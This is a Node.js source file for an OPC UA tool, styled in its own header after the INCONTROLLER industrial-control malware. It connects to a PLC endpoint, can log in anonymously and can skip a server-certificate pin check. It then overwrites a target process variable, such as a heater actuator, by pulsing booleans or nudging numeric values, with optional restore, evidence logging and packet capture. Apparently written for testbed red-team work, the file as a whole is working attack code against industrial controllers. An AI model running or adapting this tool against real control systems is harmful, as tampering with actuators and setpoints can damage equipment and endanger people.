// opcua-overwriter.mjs
// INCONTROLLER-style OPC UA "impact" tool: safe, reversible overwrite with evidence.
// Requires: node-opcua, yargs. (npm i node-opcua yargs)

import fs from "fs";
import path from "path";
import os from "os";
import crypto from "crypto";
import { spawn } from "child_process";
import pkg from "node-opcua";
import yargs from "yargs";
import { hideBin } from "yargs/helpers";

const {
  OPCUAClient,
  AttributeIds,
  DataType,
  MessageSecurityMode,
  SecurityPolicy,
  StatusCodes,
  UserTokenType,
  Variant,
} = pkg;

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function ts() { return new Date().toISOString(); }
function ensureDir(p) { fs.mkdirSync(p, { recursive: true }); }
function writeJSONL(file, obj) { fs.appendFileSync(file, JSON.stringify(obj) + "\n"); }
function sha1(buf) { return crypto.createHash("sha1").update(buf).digest("hex").toUpperCase().replace(/(..)(?=.)/g,"$1:"); }
function pemToDer(pem) {
  const s = fs.readFileSync(pem, "utf8");
  const b64 = s.replace(/-----BEGIN[^-]+-----/g,"").replace(/-----END[^-]+-----/g,"").replace(/\s+/g,"");
  return Buffer.from(b64, "base64");
}
function pickMode(s) {
  const m = (s||"").toLowerCase();
  if (m==="signandencrypt" || m==="signencrypt") return MessageSecurityMode.SignAndEncrypt;
  if (m==="sign") return MessageSecurityMode.Sign;
  return MessageSecurityMode.None;
}
function pickPolicy(s) {
  const p = (s||"").toLowerCase();
  if (p==="basic256sha256") return SecurityPolicy.Basic256Sha256;
  if (p==="aes128_sha256_rsaoaep" || p==="aes128-sha256-rsaoaep" || p==="aes128") return SecurityPolicy.Aes128_Sha256_RsaOaep;
  return SecurityPolicy.None;
}
function modeRank(m) { return m===MessageSecurityMode.SignAndEncrypt?3: m===MessageSecurityMode.Sign?2:1; }
function polRank(p) {
  return p===SecurityPolicy.Basic256Sha256?3 : p===SecurityPolicy.Aes128_Sha256_RsaOaep?2 : 1;
}

const argv = yargs(hideBin(process.argv))
  .option("endpoint", { alias:"e", type:"string", default:"opc.tcp://plc:4840", describe:"OPC UA endpoint URL" })
  .option("node", { type:"string", demandOption:true, describe:"Target nodeId (e.g., ns=1;s=heater_on or ns=2;s=Heater.Actuators.heater_on)" })
  .option("user", { alias:"u", type:"string", default:"", describe:"Username (omit => anonymous)" })
  .option("pass", { alias:"p", type:"string", default:"", describe:"Password" })

  // X.509 *user* identity (rare but supported)
  .option("x509UserCert", { type:"string", describe:"User identity certificate (PEM or DER). If set, uses X.509 user token." })
  .option("x509UserKey",  { type:"string", describe:"User identity private key (PEM). Only needed if server expects TLS mutual-auth on user token (uncommon)." })

  // Client application certificate (for secure channel)
  .option("clientCert", { type:"string", describe:"Client APPLICATION certificate (PEM). Optional; node-opcua will create a default if omitted." })
  .option("clientKey",  { type:"string", describe:"Client APPLICATION key (PEM). Required if clientCert is set." })

  // Security selection
  .option("forcePolicy", { type:"string", describe:"Force security policy (None|Basic256Sha256|Aes128_Sha256_RsaOaep)" })
  .option("forceMode", { type:"string", describe:"Force message security mode (None|Sign|SignAndEncrypt)" })
  .option("allowInsecure", { type:"boolean", default:false, describe:"Allow fallback to None/None if secure connect fails" })
  .option("pinSha1", { type:"string", describe:"Expected SHA1 of server leaf cert (AB:CD:..). If set, verify before proceeding." })
  .option("ignorePinMismatch", { type:"boolean", default:false, describe:"Do not abort if pin mismatch (logs a warning)" })

  // Action
  .option("pulseMs", { type:"number", default:1500, describe:"For booleans: millisecond pulse to inverse, then restore" })
  .option("nudgeAbs", { type:"number", describe:"For numerics: absolute delta to add temporarily" })
  .option("hold", { type:"number", default:5, describe:"Hold time (seconds) before restoring original value" })
  .option("restore", { type:"boolean", default:true, describe:"Restore original value after hold/pulse" })

  // Evidence & PKI
  .option("evidence", { type:"string", default:"/captures/opcua_phase3.jsonl", describe:"JSONL output path for evidence" })
  .option("pki", { type:"string", default:path.join(os.homedir(), ".config/node-opcua-default-nodejs/PKI"), describe:"PKI directory" })
  .option("regenClientCert", { type:"boolean", default:false, describe:"Delete own/ to force node-opcua to regenerate client cert" })

  // Optional PCAP capture (best-effort)
  .option("pcap", { type:"string", describe:"If set, start tcpdump and save PCAP here while overwriting" })
  .option("pcapFilter", { type:"string", describe:"Custom tcpdump filter. Default: 'host <endpoint-host> and port 4840'" })

  .help().argv;

(async () => {
  const evidenceFile = path.resolve(argv.evidence);
  ensureDir(path.dirname(evidenceFile));

  // Optional regenerate client cert
  if (argv.regenClientCert) {
    const own = path.join(argv.pki, "own");
    try { fs.rmSync(own, { recursive:true, force:true }); console.log(`[i] --regenClientCert: removed ${own}`); } catch {}
  }

  // Discover endpoints & choose one
  console.log(`[+] Enumerating endpoints at ${argv.endpoint} ...`);
  const tmpClient = OPCUAClient.create({ endpointMustExist:false });
  await tmpClient.connect(argv.endpoint);
  const endpoints = await tmpClient.getEndpoints();
  await tmpClient.disconnect();

  if (!endpoints || endpoints.length===0) throw new Error("No endpoints returned");

  // Save leaf & build choices
  const targetHost = new URL(argv.endpoint).hostname;
  const certDir = path.join(path.dirname(evidenceFile), "certs");
  ensureDir(certDir);

  // filter endpoints to the hostname URL (some servers expose multiple)
  const eps = endpoints.filter(e => (e.endpointUrl||"").includes(targetHost));

  function matchForced(e) {
    if (!argv.forcePolicy && !argv.forceMode) return true;
    const sp = e.securityPolicyUri || "";
    const mm = e.securityMode || MessageSecurityMode.None;
    const wantP = argv.forcePolicy ? pickPolicy(argv.forcePolicy) : null;
    const wantM = argv.forceMode ? pickMode(argv.forceMode) : null;
    const polOk = wantP===null || sp.endsWith(SecurityPolicy[wantP]);
    const modeOk = wantM===null || mm===wantM;
    return polOk && modeOk;
  }

  let candidates = (eps.length?eps:endpoints).slice().filter(matchForced);
  if (candidates.length===0) candidates = (eps.length?eps:endpoints).slice();

  candidates.sort((a,b)=>{
    const am = a.securityMode, bm = b.securityMode;
    const ap = a.securityPolicyUri||"", bp = b.securityPolicyUri||"";
    // rank strongest first
    const mr = modeRank(am) - modeRank(bm);
    if (mr!==0) return -mr;
    const pr = polRank(
      ap.endsWith("Basic256Sha256")?SecurityPolicy.Basic256Sha256 :
      ap.endsWith("Aes128_Sha256_RsaOaep")?SecurityPolicy.Aes128_Sha256_RsaOaep : SecurityPolicy.None
    ) - polRank(
      bp.endsWith("Basic256Sha256")?SecurityPolicy.Basic256Sha256 :
      bp.endsWith("Aes128_Sha256_RsaOaep")?SecurityPolicy.Aes128_Sha256_RsaOaep : SecurityPolicy.None
    );
    return -pr;
  });

  const chosen = candidates[0];
  const chosenPol = (chosen.securityPolicyUri||"").split("#").pop()||"None";
  const chosenMode = MessageSecurityMode[chosen.securityMode]||"None";
  const serverLeaf = Buffer.from(chosen.serverCertificate||[]);
  if (serverLeaf.length) {
    const outDer = path.join(certDir, `${targetHost}-server.der`);
    fs.writeFileSync(outDer, serverLeaf);
    console.log(`[+] Saved server certificate to ${outDer}`);
  }

  // Pin check
  const leafSha1 = serverLeaf.length ? sha1(serverLeaf) : "(none)";
  if (argv.pinSha1) {
    const expected = argv.pinSha1.toUpperCase().replace(/[^0-9A-F]/g, "").replace(/(..)(?=.)/g,"$1:");
    if (leafSha1 !== expected) {
      const msg = `[!] Pin mismatch: got ${leafSha1}, expected ${expected}`;
      if (argv.ignorePinMismatch) console.warn(msg);
      else throw new Error(msg);
    }
  }

  // Prepare tcpdump (best-effort)
  let tcpdump;
  if (argv.pcap) {
    try {
      const host = new URL(argv.endpoint).hostname;
      const filter = argv.pcapFilter || `(host ${host}) and port 4840`;
      ensureDir(path.dirname(argv.pcap));
      tcpdump = spawn("tcpdump", ["-i","eth0","-w", argv.pcap, filter], { stdio:"ignore" });
      writeJSONL(evidenceFile, { t:ts(), event:"pcap_start", file:argv.pcap, filter });
    } catch (e) {
      console.warn("[!] tcpdump start failed (continuing):", e.message);
    }
  }

  // Create real client with selected security
  const clientOptions = {
    endpointMustExist:false,
    securityMode: pickMode(chosenMode),
    securityPolicy: pickPolicy(chosenPol),
    applicationName: "ICS-Testbed-Overwriter",
    // pki handled automatically under ~/.config/... unless you pass explicit certs
  };
  if (argv.clientCert && argv.clientKey) {
    clientOptions.certificateFile = argv.clientCert;
    clientOptions.privateKeyFile  = argv.clientKey;
  }
  const client = OPCUAClient.create(clientOptions);

  const userDesc = argv.x509UserCert ? "x509-user" : (argv.user ? "user" : "anonymous");
  console.log(`[+] Connecting (${chosenPol}/${chosenMode}) to ${argv.endpoint} as ${userDesc} ...`);

  // evidence: connection plan
  writeJSONL(evidenceFile, {
    t: ts(), event: "connect_plan",
    endpoint: argv.endpoint,
    selectedPolicy: chosenPol, selectedMode: chosenMode,
    leafSha1, user: userDesc
  });

  await client.connect(argv.endpoint);

  // Build identity
  let identity = null;
  if (argv.x509UserCert) {
    // X.509 user identity expects DER in certificateData
    const der = argv.x509UserCert.toLowerCase().endsWith(".pem") ? pemToDer(argv.x509UserCert) : fs.readFileSync(argv.x509UserCert);
    identity = { type: UserTokenType.Certificate, certificateData: der };
  } else if (argv.user) {
    identity = { type: UserTokenType.UserName, userName: argv.user, password: argv.pass||"" };
  } else {
    identity = { type: UserTokenType.Anonymous };
  }

  const session = await client.createSession(identity);

  // Read current value + access bits
  const nodeId = argv.node;
  const [dvVal, dvAcc, dvUAcc, dvDT] = await session.read([
    { nodeId, attributeId: AttributeIds.Value },
    { nodeId, attributeId: AttributeIds.AccessLevel },
    { nodeId, attributeId: AttributeIds.UserAccessLevel },
    { nodeId, attributeId: AttributeIds.DataType },
  ]);

  const sc = (x)=> (x?.statusCode ? x.statusCode.name : "Unknown");
  if (dvVal.statusCode.isNotGood()) throw new Error(`Read Value failed: ${sc(dvVal)}`);

  const cur = dvVal.value?.value;
  const dataType = dvVal.value?.dataType ?? DataType.Null;
  const access = Number(dvAcc?.value?.value ?? 0);
  const uaccess = Number(dvUAcc?.value?.value ?? 0);
  const WRITE = 0x02;
  const writeAllowed = (access & WRITE) && (uaccess & WRITE);

  writeJSONL(evidenceFile, {
    t: ts(), event:"inspect",
    nodeId, dataType, access, uaccess, currentValue: cur
  });

  const dtName = DataType[dataType] || "Unknown";
  console.log(`[i] Target: ${nodeId}  DataType=${dtName}  cur=${cur}`);
  if (!writeAllowed) console.warn("[!] Warning: target might be read-only for this user (write bits not set).");

  // Helper: write value
  async function writeValue(val, dtype = dataType) {
    const v = new Variant({ dataType: dtype, value: val });
    const status = await session.write({ nodeId, attributeId: AttributeIds.Value, value: { value: v }});
    writeJSONL(evidenceFile, { t: ts(), event:"write", nodeId, attemptedValue: val, dataType: dtype, status: status.name });
    return status;
  }

  // Decide action
  if (dataType === DataType.Boolean) {
    const inverse = !Boolean(cur);
    const pulseMs = Math.max(0, Number(argv.pulseMs || 0));
    console.log(`[i] Boolean write -> ${inverse} (pulse ${pulseMs}ms), then restore=${!!argv.restore}`);

    let s1 = await writeValue(inverse, DataType.Boolean);
    console.log(`[i] Boolean write -> ${inverse}: ${s1.name}`);
    if (pulseMs>0) await sleep(pulseMs);

    if (argv.restore) {
      let s2 = await writeValue(Boolean(cur), DataType.Boolean);
      console.log(`[i] Restored boolean -> ${Boolean(cur)}: ${s2.name}`);
    }
  } else if ([DataType.Double, DataType.Float, DataType.Int16, DataType.Int32, DataType.Int64, DataType.UInt16, DataType.UInt32, DataType.UInt64, DataType.SByte, DataType.Byte].includes(dataType)) {
    if (typeof argv.nudgeAbs !== "number") {
      throw new Error("Provide --nudgeAbs (absolute delta) for numeric targets.");
    }
    const delta = argv.nudgeAbs;
    const newVal = (typeof cur === "number") ? cur + delta : delta;
    const holdMs = Math.max(0, Number(argv.hold || 0) * 1000);

    console.log(`[i] Numeric nudge: cur=${cur} delta=${delta} -> ${newVal}; hold=${holdMs}ms; restore=${!!argv.restore}`);
    let s1 = await writeValue(newVal, dataType);
    console.log(`[i] Nudge write -> ${newVal}: ${s1.name}`);

    if (holdMs>0) await sleep(holdMs);

    if (argv.restore) {
      let s2 = await writeValue(cur, dataType);
      console.log(`[i] Restored numeric -> ${cur}: ${s2.name}`);
    }
  } else {
    console.warn("[!] Target is neither Boolean nor numeric; nothing done.");
  }

  writeJSONL(evidenceFile, { t: ts(), event:"done" });

  await session.close();
  await client.disconnect();

  if (tcpdump) {
    try { process.kill(tcpdump.pid); writeJSONL(evidenceFile, { t:ts(), event:"pcap_stop" }); } catch {}
  }

  console.log("[+] Done.");
})().catch(async (err) => {
  console.error("[!] Error:", err.message || err);
  process.exitCode = 1;
});

